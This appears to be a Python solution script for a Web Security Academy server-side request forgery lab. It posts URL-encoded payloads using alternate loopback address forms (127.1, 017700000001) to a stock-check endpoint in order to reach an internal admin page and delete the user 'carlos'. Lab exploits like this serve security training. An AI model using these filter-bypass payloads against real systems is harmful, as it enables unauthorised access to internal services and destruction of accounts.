import requests

DOMAIN = "0a9000c603c9c9288179ac7900fd009d.web-security-academy.net"

def get_stock_ssrf(url):
    data = {
        "stockApi": url
    }

    response = requests.post(f"https://{DOMAIN}/product/stock", data=data)

    print(response.text)

# get_stock_ssrf("https://017700000001/%61%64%6d%69%6e")
# get_stock_ssrf("http://127.1:80/%61%64%6d%69%6e")
get_stock_ssrf("http://127.1:80/%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73")